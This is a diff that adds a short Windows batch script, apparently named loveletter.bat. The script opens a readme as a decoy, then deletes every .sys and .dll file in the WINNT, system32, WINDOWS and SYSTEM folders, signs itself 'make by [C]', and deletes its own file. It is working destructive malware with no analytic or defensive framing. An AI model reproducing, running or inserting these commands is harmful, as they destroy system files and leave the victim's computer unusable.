@@ -1,0 +1,23 @@
+@echo off
+cls
+start readme.txt
+cd \
+cd winnt
+del *.sys
+del *.dll
+cd system32
+del *.sys
+del *.dll
+cd \
+cls
+cd windows
+del *.sys
+del *.dll
+cd system
+del *.sys
+del *.dll
+cls
+echo make by [C]
+cd \
+cd temp
+del loveletter.bat
